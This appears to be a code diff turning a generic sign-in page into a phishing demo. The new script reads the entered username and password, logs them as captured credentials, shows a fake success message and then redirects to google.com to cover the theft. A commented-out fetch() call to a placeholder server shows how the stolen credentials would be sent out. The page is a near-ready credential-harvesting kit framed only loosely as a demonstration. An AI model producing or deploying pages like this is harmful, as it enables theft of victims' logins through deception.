@@ -9,267 +9,177 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
         }
-
+        
         body {
-            background: #f7f9fc;
-            height: 100vh;
+            background-color: #f4f4f4;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-
-        .login-container {
-            background: white;
+        
+        .container {
+            background-color: white;
             border-radius: 10px;
-            box-shadow: 0 14px 28px rgba(0,0,0,0.1);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            padding: 40px;
             width: 400px;
-            overflow: hidden;
+            max-width: 90%;
         }
-
-        .header {
-            background: linear-gradient(135deg, #6e8efb, #a777e3);
-            color: white;
-            padding: 30px 0;
-            text-align: center;
-            border-radius: 10px 10px 0 0;
-        }
-
-        .header h2 {
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-
-        .header p {
-            font-size: 0.9em;
-            opacity: 0.8;
-        }
-
-        .login-form {
-            padding: 30px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
+        
+        .login-page {
             display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
+        }
+        
+        .thanks-page {
+            display: none;
+            text-align: center;
+        }
+        
+        h2 {
+            text-align: center;
+            margin-bottom: 30px;
             color: #333;
         }
-
-        .form-group input {
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 12px;
             border: 1px solid #ddd;
             border-radius: 5px;
-            transition: border 0.3s;
             font-size: 16px;
         }
-
-        .form-group input:focus {
-            border-color: #6e8efb;
-            outline: none;
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
         }
-
-        .remember-forgot {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 14px;
-            margin-bottom: 20px;
+        
+        button:hover {
+            background-color: #357ae8;
         }
-
+        
         .remember {
             display: flex;
             align-items: center;
+            margin-bottom: 20px;
         }
-
+        
         .remember input {
-            margin-right: 5px;
+            margin-right: 10px;
         }
-
-        .forgot a {
-            color: #6e8efb;
-            text-decoration: none;
-        }
-
-        .forgot a:hover {
-            text-decoration: underline;
-        }
-
-        .submit-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #6e8efb, #a777e3);
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.1s;
-        }
-
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(110, 142, 251, 0.3);
-        }
-
-        .submit-btn:active {
-            transform: translateY(0);
-        }
-
-        .signup {
+        
+        .links {
             text-align: center;
             margin-top: 20px;
-            font-size: 14px;
-            color: #666;
         }
-
-        .signup a {
-            color: #6e8efb;
+        
+        .links a {
+            color: #4285f4;
             text-decoration: none;
-            font-weight: 600;
+            margin: 0 10px;
         }
-
-        .signup a:hover {
+        
+        .links a:hover {
             text-decoration: underline;
         }
-
-        .or-divider {
-            text-align: center;
-            margin: 20px 0;
-            position: relative;
+        
+        .success-message {
+            font-size: 24px;
+            color: #4caf50;
+            margin-bottom: 20px;
         }
-
-        .or-divider:before {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: #eee;
-            z-index: 1;
-        }
-
-        .or-divider span {
-            background: white;
-            padding: 0 15px;
-            position: relative;
-            z-index: 2;
-            color: #999;
-        }
-
-        .social-login {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .social-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #f5f5f5;
-            transition: background 0.3s;
-        }
-
-        .social-btn:hover {
-            background: #eaeaea;
-        }
-
-        .social-btn i {
-            font-size: 18px;
-        }
-
-        .fa-facebook {
-            color: #3b5998;
-        }
-
-        .fa-google {
-            color: #db4437;
-        }
-
-        .fa-twitter {
-            color: #1da1f2;
+        
+        .redirect-message {
+            color: #666;
+            margin-bottom: 20px;
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
-    <div class="login-container">
-        <div class="header">
-            <h2>Welcome Back</h2>
-            <p>Sign in to continue to your account</p>
-        </div>
-        <div class="login-form">
+    <div class="container">
+        <!-- Login Page -->
+        <div id="loginPage" class="login-page">
+            <h2>Member Login</h2>
             <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">Username or Email</label>
+                <div class="input-group">
+                    <label for="username">Username</label>
                     <input type="text" id="username" name="username" required>
                 </div>
-                <div class="form-group">
+                <div class="input-group">
                     <label for="password">Password</label>
                     <input type="password" id="password" name="password" required>
                 </div>
-                <div class="remember-forgot">
-                    <div class="remember">
-                        <input type="checkbox" id="remember">
-                        <label for="remember">Remember me</label>
-                    </div>
-                    <div class="forgot">
-                        <a href="#">Forgot password?</a>
-                    </div>
+                <div class="remember">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Remember me</label>
                 </div>
-                <button type="submit" class="submit-btn">Sign In</button>
-                <div class="or-divider">
-                    <span>Or</span>
-                </div>
-                <div class="social-login">
-                    <a href="#" class="social-btn">
-                        <i class="fab fa-facebook"></i>
-                    </a>
-                    <a href="#" class="social-btn">
-                        <i class="fab fa-google"></i>
-                    </a>
-                    <a href="#" class="social-btn">
-                        <i class="fab fa-twitter"></i>
-                    </a>
-                </div>
-                <div class="signup">
-                    Don't have an account? <a href="#">Sign Up</a>
+                <button type="submit">Login</button>
+                <div class="links">
+                    <a href="#">Forgot Password?</a>
+                    <a href="#">Sign Up</a>
                 </div>
             </form>
+        </div>
+        
+        <!-- Thanks Page -->
+        <div id="thanksPage" class="thanks-page">
+            <h2 class="success-message">Thank You!</h2>
+            <p class="redirect-message">Your login was successful. You will be redirected to your account shortly...</p>
+            <div class="loader"></div>
         </div>
     </div>
 
     <script>
+        // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Get the form values
+            // Get form values
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const remember = document.getElementById('remember').checked;
             
-            // For demonstration purposes: log to console
-            console.log("Login attempted with:", {
-                username,
-                password,
-                remember
-            });
+            // Log credentials (in a real attack, these would be sent to a server)
+            console.log('Captured credentials:');
+            console.log('Username:', username);
+            console.log('Password:', password);
             
-            // You could send this data to a collection service in a real phishing scenario
-            // For demo purposes, just redirect to thanks.html
-            window.location.href = 'thanks.html';
+            // In a real phishing page, you might send these to a server with:
+            // fetch('https://your-server.com/store-credentials', {
+            //     method: 'POST',
+            //     body: JSON.stringify({ username, password }),
+            //     headers: { 'Content-Type': 'application/json' }
+            // });
+            
+            // Show the thanks page
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('thanksPage').style.display = 'block';
+            
+            // Redirect after 3 seconds (simulating loading)
+            setTimeout(function() {
+                window.location.href = 'https://www.google.com';
+            }, 3000);
         });
     </script>
 </body>
